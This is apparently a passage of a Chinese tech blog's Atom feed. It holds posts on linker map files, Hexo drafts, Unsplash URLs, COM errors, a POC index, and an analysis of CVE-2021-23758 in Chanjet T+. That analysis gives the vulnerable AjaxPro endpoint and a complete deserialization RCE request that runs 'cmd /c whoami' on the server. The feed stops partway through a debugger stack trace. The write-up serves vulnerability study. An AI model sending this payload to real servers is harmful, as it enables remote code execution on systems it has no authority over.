zlibstat_VC2017_x86_MTd:deflate.obj</span><br><span class="line"> 0001:00239830       _deflateGetDictionary@12   1023a830 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br><span class="line"> 0001:002398d0       _deflateCopy@8             1023a8d0 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br></pre></td></tr></table></figure><p>解析：</p><p>这段内容来自于一个 <code>.map</code> 文件，它是链接器在编译和链接过程结束后生成的，包含了程序中符号的地址、类型和一些其他信息。这个特定的 <code>.map</code> 文件片段列出了与 zlib 压缩库相关的一些函数。以下是对这些条目的分析：</p><ol><li><p>每一列的具体含义可能因编译器和链接器的不同而略有不同，但通常包括：</p><ul><li><strong>地址</strong>：符号在内存中的地址。</li><li><strong>装饰后的名称</strong>：C++ 编译器可能会对函数名称进行装饰，以包含关于函数签名的信息。</li><li><strong>原始名称</strong>：如果装饰后的名称存在，原始名称也会被列出。</li><li><strong>大小</strong>：符号的大小（通常是函数的代码大小）。</li><li><strong>段</strong>：符号所在的内存段。</li><li><strong>文件名</strong>：符号定义的源文件。</li></ul></li><li><p><code>_crc32@12</code>、<code>_crc32_z@12</code>、<code>_crc32_combine@12</code>、<code>_crc32_combine64@16</code>：这些是 CRC32 校验函数的不同版本，<code>@12</code> 和 <code>@16</code> 表示函数的参数大小（以字节为单位）。CRC32 是一种常用的数据校验算法。</p></li><li><p><code>_get_crc_table@0</code>：这个函数可能返回一个 CRC32 表的指针，该表用于优化 CRC32 计算。</p></li><li><p><code>_deflate@8</code>、<code>_deflateEnd@4</code>、<code>_deflateSetDictionary@12</code>、<code>_deflateGetDictionary@12</code>、<code>_deflateCopy@8</code>：这些函数是 zlib 压缩库中用于数据压缩的不同函数。<code>_deflate@8</code> 是压缩数据的主要函数，而 <code>_deflateEnd@4</code> 用于清理压缩流。<code>_deflateSetDictionary@12</code> 和 <code>_deflateGetDictionary@12</code> 用于设置和获取压缩字典，这可以提高压缩效率。<code>_deflateCopy@8</code> 可能用于复制压缩流的状态。</p></li><li><p>每个函数后面的 <code>f</code> 可能表示这些符号是文件（file）级别的，即它们是可执行文件或库文件的一部分，而不是导入的。</p></li><li><p><code>zlibstat_VC2017_x86_MTd:crc32.obj</code> 和 <code>zlibstat_VC2017_x86_MTd:deflate.obj</code> 表示这些符号分别来自 <code>crc32.obj</code> 和 <code>deflate.obj</code> 对象文件，这些对象文件是 <code>zlibstat_VC2017_x86_MTd</code> 项目或解决方案的一部分。<code>VC2017_x86_MTd</code> 可能表示这是用 Visual Studio 2017 编译的，针对 x86 平台，使用了多线程（MT）调试（d）配置。</p></li></ol><p>通过分析 <code>.map</code> 文件，开发者可以更好地理解程序的内存布局和符号信息，这对于调试和性能分析非常有用。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：通过 map 文件查看引入的函数都是从哪个文件导入的&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="Visual Studio" scheme="http://example.com/categories/A-OS/Windows/Visual-Studio/"/>
    
    
    <category term="Visual Studio" scheme="http://example.com/tags/Visual-Studio/"/>
    
  </entry>
  
  <entry>
    <title>【手册】Hexo draft 使用</title>
    <link href="http://example.com/E_%E6%89%8B%E5%86%8C/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91Hexo%20draft%20%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/E_%E6%89%8B%E5%86%8C/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91Hexo%20draft%20%E4%BD%BF%E7%94%A8/</id>
    <published>2024-04-22T16:00:00.000Z</published>
    <updated>2024-04-23T03:18:55.360Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：Hexo 使用草稿箱</p></blockquote><span id="more"></span><h3 id="创建草稿"><a href="#创建草稿" class="headerlink" title="创建草稿"></a>创建草稿</h3><p>创建草稿需要使用 draft 布局，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new draft &quot;Draft Demo&quot;</span><br><span class="line">INFO  Created: ~/VScode/blog/source/_drafts/Draft-Demo.md</span><br></pre></td></tr></table></figure><h3 id="预览草稿"><a href="#预览草稿" class="headerlink" title="预览草稿"></a>预览草稿</h3><p>默认情况下，草稿不会显示在页面中，如果想要显示可以在站点配置文件 _config.yml 中把 render_drafts 参数设为 true 来预览草稿。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_drafts: true</span><br></pre></td></tr></table></figure><p>或者在启动服务器时加上 <code>--draft</code> 参数来预览草稿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server --draft</span><br></pre></td></tr></table></figure><h3 id="发布草稿"><a href="#发布草稿" class="headerlink" title="发布草稿"></a>发布草稿</h3><p>将草稿文件发布到 _posts 文件夹下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish post Draft-Demo</span><br><span class="line">INFO  Published: ~/VScode/blog/source/_posts/Draft-Demo.md</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：Hexo 使用草稿箱&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="E_手册" scheme="http://example.com/categories/E-%E6%89%8B%E5%86%8C/"/>
    
    
  </entry>
  
  <entry>
    <title>【POC】POC 索引</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90POC%E3%80%91POC%20%E7%B4%A2%E5%BC%95/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90POC%E3%80%91POC%20%E7%B4%A2%E5%BC%95/</id>
    <published>2024-04-17T16:00:00.000Z</published>
    <updated>2024-05-11T09:52:35.931Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：POC 引路</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><p>[toc]</p><h2 id="已整理"><a href="#已整理" class="headerlink" title="已整理"></a>已整理</h2><h3 id="畅捷通"><a href="#畅捷通" class="headerlink" title="畅捷通"></a>畅捷通</h3><h4 id="CVE-2021-23758-畅捷通反序列化"><a href="#CVE-2021-23758-畅捷通反序列化" class="headerlink" title="CVE-2021-23758 畅捷通反序列化"></a>CVE-2021-23758 畅捷通反序列化</h4><a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/" title="【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞">【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞</a><h4 id="QVD-2021-13612-畅捷通SQL注入"><a href="#QVD-2021-13612-畅捷通SQL注入" class="headerlink" title="QVD-2021-13612 畅捷通SQL注入"></a>QVD-2021-13612 畅捷通SQL注入</h4><a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/" title="【QVD-2023-13612】畅捷通T+ SQL 注入漏洞">【QVD-2023-13612】畅捷通T+ SQL 注入漏洞</a><h3 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h3><h4 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h4><a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="【CVE-2020-0688】exchange远程代码执行漏洞复现">【CVE-2020-0688】exchange远程代码执行漏洞复现</a><h2 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h2><p><a href="https://github.com/stars/holdyounger/lists/poc">Your list &#x2F; POC</a></p><h2 id="好文推荐"><a href="#好文推荐" class="headerlink" title="好文推荐"></a>好文推荐</h2><ol><li><a href="https://bbs.zkaq.cn/t/30534.html">畅捷通T+任意文件上传(CNVD-2022-60632 )漏洞复现- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者</a><br>畅捷通文件结构分析，可执行文件分析</li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：POC 引路&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>【手册】UnSplash 图源API查询手册</title>
    <link href="http://example.com/E_%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91UnSplash%20%E5%9B%BE%E6%BA%90API%E6%9F%A5%E8%AF%A2%E6%89%8B%E5%86%8C/"/>
    <id>http://example.com/E_%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91UnSplash%20%E5%9B%BE%E6%BA%90API%E6%9F%A5%E8%AF%A2%E6%89%8B%E5%86%8C/</id>
    <published>2024-04-16T16:00:00.000Z</published>
    <updated>2024-04-28T06:02:10.601Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：UnSplash 接口快速查询手册</p></blockquote><span id="more"></span><h3 id="通用接口"><a href="#通用接口" class="headerlink" title="通用接口"></a>通用接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/1280x640/?Technology</span><br></pre></td></tr></table></figure><p>支持的分类有： <a href="https://mani-unsplash-clone.netlify.app/s/wallaper">Wallpaper</a>、<a href="https://mani-unsplash-clone.netlify.app/s/nature">Nature</a>、<a href="https://mani-unsplash-clone.netlify.app/s/people">People</a>、<a href="https://mani-unsplash-clone.netlify.app/s/architecture">Architecture</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Events">Events</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Business">Busines</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Experimental">Experimental</a>、<a href="https://mani-unsplash-clone.netlify.app/s/fashion">Fashion</a>、<a href="https://mani-unsplash-clone.netlify.app/s/film">Film</a>、<a href="https://mani-unsplash-clone.netlify.app/s/health">Health</a>、<a href="https://mani-unsplash-clone.netlify.app/s/technology">Technology</a>、<a href="https://mani-unsplash-clone.netlify.app/s/travel">Travel</a>、<a href="https://mani-unsplash-clone.netlify.app/s/textures">Textures</a>、<a href="https://mani-unsplash-clone.netlify.app/s/animals">Animals</a>、<a href="https://mani-unsplash-clone.netlify.app/s/food">Food</a>、<a href="https://mani-unsplash-clone.netlify.app/s/athletics">Athletics</a>、<a href="https://mani-unsplash-clone.netlify.app/s/spirituality">Spirituality</a>、<a href="https://mani-unsplash-clone.netlify.app/s/arts">Arts</a>、<a href="https://mani-unsplash-clone.netlify.app/s/history">History</a></p><h2 id="随机图片"><a href="#随机图片" class="headerlink" title="随机图片"></a>随机图片</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/random</span><br></pre></td></tr></table></figure><h2 id="指定用户"><a href="#指定用户" class="headerlink" title="指定用户"></a>指定用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/user/&#123;USERNAME&#125;</span><br></pre></td></tr></table></figure><p>指定尺寸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/random/&#123;WIDTH&#125;x&#123;HEIGHT&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------</span><br><span class="line">https://source.unsplash.com/random/1280X960</span><br><span class="line">https://source.unsplash.com/random/800X600</span><br><span class="line">https://source.unsplash.com/random/2560X1920</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：UnSplash 接口快速查询手册&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="E_手册" scheme="http://example.com/categories/E-%E6%89%8B%E5%86%8C/"/>
    
    <category term="个人配置" scheme="http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="手册" scheme="http://example.com/tags/%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>【COM】开发经验整理</title>
    <link href="http://example.com/A_OS/Windows/COM/%E3%80%90COM%E3%80%91%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E6%95%B4%E7%90%86/"/>
    <id>http://example.com/A_OS/Windows/COM/%E3%80%90COM%E3%80%91%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E6%95%B4%E7%90%86/</id>
    <published>2024-04-16T16:00:00.000Z</published>
    <updated>2024-04-18T01:12:39.111Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：开发中遇到的 COM 异常和相关文章整理</p></blockquote><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>COM+ 线程模型</li></ol><h2 id="文章整理"><a href="#文章整理" class="headerlink" title="文章整理"></a>文章整理</h2><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h3><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/component-services-portal">COM+（组件服务） - Win32 apps | Microsoft Learn</a><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/com--contexts-and-threading-models">COM+ 上下文和线程模型 - Win32 apps | Microsoft Learn</a><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/com--threading-models">COM+ 线程模型 - Win32 apps | Microsoft Learn</a></li></ol></li></ol></li></ol><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="创建对象异常"><a href="#创建对象异常" class="headerlink" title="创建对象异常"></a>创建对象异常</h3><h4 id="CoinitializeEx-返回-0x80010106"><a href="#CoinitializeEx-返回-0x80010106" class="headerlink" title="CoinitializeEx 返回 0x80010106"></a>CoinitializeEx 返回 0x80010106</h4><p>关键字：<strong>COINIT_MULTITHREADED</strong> 、<strong>COINIT_APARTMENTTHREADED</strong> </p><p><a href="https://blog.csdn.net/guo_lei_lamant/article/details/123431041">CoInitializeEx返回 “0x80010106“ 或者 “RPC_E_CHANGED_MODE“-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：开发中遇到的 COM 异常和相关文章整理&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="COM" scheme="http://example.com/categories/A-OS/Windows/COM/"/>
    
    
    <category term="COM" scheme="http://example.com/tags/COM/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-04-15T16:00:00.000Z</published>
    <updated>2024-05-10T02:24:27.461Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述： CVE-2021-23758 Ajax.NET Professional 中的 RCE 反序列化漏洞分析及说明</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>Ajax.NET Professional (AjaxPro)是最先把AJAX技术应用在微软.NET环境下框架之一，具有部署简单、使用方便、运行高效等特点； 该框架能够创建一个代理类且可以使客户端的JS代码实现调用服务端的方法，并能返回各种在.NET里使用的类型；使用该框架和直接使用.NET基本无差别。</p><p>该漏洞是由于AjaxPro开源组件.NET Class Handler存在对输入数据限制检查不严格引起的；该AjaxPro框架在JavaScriptDeserializer.DeserializeFromJson函数反序列化过程中，如果通过<code>__type</code>获取的<code>Type</code>对象且可对其<code>Type</code>对象修改，攻击者可利用该漏洞在目标主机上执行任意代码。</p><p>详见后文分析。</p><h2 id="受影响软件"><a href="#受影响软件" class="headerlink" title="受影响软件"></a>受影响软件</h2><h3 id="畅捷通-T-GetStoreWarehouseByStore-反序列化漏洞"><a href="#畅捷通-T-GetStoreWarehouseByStore-反序列化漏洞" class="headerlink" title="畅捷通 T+ GetStoreWarehouseByStore 反序列化漏洞"></a>畅捷通 T+ GetStoreWarehouseByStore 反序列化漏洞</h3><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>T+13.0、T+16.0</p><h3 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>分析内容在<a href="#%E5%A0%86%E6%A0%88">堆栈</a>章节</p><p>漏洞主要是因为<code>ajaxPro</code>组件存在 <code> CVE-2021-23758</code>，但是这个漏洞有个要求是传输的参数类型必须是 <code>object</code></p><p>通过反编译</p><p><code>App_Code.dll</code> 的 <code>Ufida.T.CodeBehind._PriorityLevel </code>中 <code>GetStoreWarehouseByStore</code> 方法满足这个要求</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416102037475.png" class="" title="image-20240416102037475"><p>可以看到 <code>GetStoreWarehouseByStore</code> 由<code>[AjaxMethod]</code>修饰，接收一个 <code>object</code> 类型的参数 <code>storeID</code></p><p>所以路径就是</p><p><code>/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore</code></p><p>&#x2F;tplus 是 nginx 的映射路径，&#x2F;ajaxpro&#x2F;* 则是 web.config 中定义的 ajaxPro 组件处理路径</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>执行 POC 会在 tplus 目录下生成 testwhoami.txt 文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">X-Ajaxpro-Method: GetStoreWarehouseByStore</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: close</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 597</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;storeID&quot;:&#123;</span><br><span class="line">    &quot;__type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;,</span><br><span class="line">    &quot;MethodName&quot;:&quot;Start&quot;,</span><br><span class="line">    &quot;ObjectInstance&quot;:&#123;</span><br><span class="line">        &quot;__type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,</span><br><span class="line">        &quot;StartInfo&quot;: &#123;</span><br><span class="line">            &quot;__type&quot;:&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,</span><br><span class="line">            &quot;FileName&quot;:&quot;cmd&quot;, &quot;Arguments&quot;:&quot;/c whoami &gt; testwhoami.txt&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416155119279.png" class="" title="执行结果"><h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>如上所示POC，可以看到在执行 Arguments 时，ping 命令调用到了 <code>System.Diagnostics.Process.Start</code> 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> System.dll!System.Diagnostics.Process.Start() (IL=0x0000, Native=0x09963278+0x8)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL=epilog, Native=0x6A109B90+0xCA)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E)</span><br><span class="line"> mscorlib.dll!System.RuntimeType.InvokeMember(string name, System.Reflection.BindingFlags bindingFlags, System.Reflection.Binder binder, object target, object[] providedArgs, System.Reflection.ParameterModifier[] modifiers, System.Globalization.CultureInfo culture, string[] namedParams) (IL≈0x073D, Native=0x6A0CE270+0xAC8)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.InvokeMethodOnInstance(out System.Exception e) (IL≈0x0025, Native=0x09963000+0x82)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.QueryWorker(object obj) (IL≈0x008C, Native=0x09962750+0xF5)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.BeginQuery() (IL=epilog, Native=0x03A4FE18+0xC8)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.ObjectInstance.set(object value) (IL=epilog, Native=0x09962DB8+0x9B)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL≈0x0016, Native=0x6A109B90+0x61)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] index, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A0EF6E0+0x65)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, object[] index) (IL=epilog, Native=0x6A0EF6C0+0x18)</span><br><span class="line">&gt;AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) (IL≈0x015E, Native=0x03A67FF8+0x311)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) (IL≈0x0151, Native=0x00CF5D30+0x2E6)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() (IL≈0x0180, Native=0x12CA1F98+0x290)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() (IL≈0x01F6, Native=0x12CA0040+0x3B8)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=0x0010, Native=0x12C7FA58+0x2C)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL≈0x018D, Native=0x12A84DC0+0x305)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=0x0E35F2A8+0x6E)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, ref bool completedSynchronously) (IL≈0x0015, Native=0x0E35F070+0x4A)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ApplicationStepManager.ResumeSteps(System.Exception error) (IL≈0x00F6, Native=0x0E35D228+0x1C7)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.System.Web.IHttpAsyncHandler.BeginProcessRequest(System.Web.HttpContext context, System.AsyncCallback cb, object extraData) (IL=0x005C, Native=0x0E35CC68+0xDC)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestInternal(System.Web.HttpWorkerRequest wr) (IL≈0x015B, Native=0x06F5CCF0+0x29B)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestNoDemand(System.Web.HttpWorkerRequest wr) (IL=epilog, 